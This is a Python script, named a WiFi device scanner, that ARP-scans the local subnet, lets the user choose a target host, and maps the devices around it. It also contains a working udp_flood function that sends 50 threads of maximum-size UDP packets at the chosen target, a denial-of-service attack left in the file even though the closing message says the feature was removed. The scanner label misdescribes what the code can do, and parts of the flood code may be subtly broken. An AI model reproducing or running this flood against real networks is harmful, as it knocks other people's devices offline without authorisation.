#!/usr/bin/env python3
import subprocess
import socket
import threading
import time
import netifaces
from scapy.all import ARP, Ether, srp, IP, UDP, RandShort, send
import sys

def get_local_subnet():
    gateways = netifaces.gateways()
    
    # Safe default gateway detection
    default = gateways.get('default')
    if not default or netifaces.AF_INET not in default:
        print("[-] No default gateway found. Make sure you are connected to WiFi.")
        sys.exit(1)
    
    iface = default[netifaces.AF_INET][1]

    addrs = netifaces.ifaddresses(iface)
    if netifaces.AF_INET not in addrs:
        print("[-] No IPv4 address found on interface.")
        sys.exit(1)

    ip = addrs[netifaces.AF_INET][0]['addr']
    subnet = '.'.join(ip.split('.')[:-1]) + '.0/24'
    return subnet

def scan_network(subnet):
    print(f"[+] Scanning {subnet}...")
    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def select_target(devices):
    print("\nAvailable devices:")
    for i, device in enumerate(devices):
        print(f"{i}: {device['ip']} ({device['mac']})")
    
    try:
        choice = int(input("Select target IP index: "))
        return devices[choice]['ip']
    except:
        print("Invalid input!")
        sys.exit(1)

def udp_flood(target_ip, duration=30):
    print(f"[+] Starting UDP flood on {target_ip} for {duration}s...")
    
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = b'X' * 65535
        sent = 0
        while sent < duration * 100:
            sock.sendto(bytes_data, (target_ip, RandShort()))
            sent += 1
    
    threads = []
    for i in range(50):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    print("[+] Flood stopped.")

def scan_target_network(target_ip):
    subnet = '.'.join(target_ip.split('.')[:-1]) + '.0/24'
    print(f"[+] Scanning devices around {target_ip}...")
    devices = scan_network(subnet)
    connected = [d for d in devices if d['ip'] != target_ip]
    return connected

if __name__ == "__main__":
    print("WiFi Connected Devices Scanner Tool")
    
    subnet = get_local_subnet()
    devices = scan_network(subnet)
    
    if not devices:
        print("No devices found!")
        sys.exit(1)
    
    target_ip = select_target(devices)
    print(f"\n[+] Target selected: {target_ip}")
    
    nearby_devices = scan_target_network(target_ip)
    print("\nNearby devices:")
    for i, dev in enumerate(nearby_devices):
        print(f"{i}: {dev['ip']}")
    
    print("\n[!] Note: Spam feature removed for safety (ethical use only)")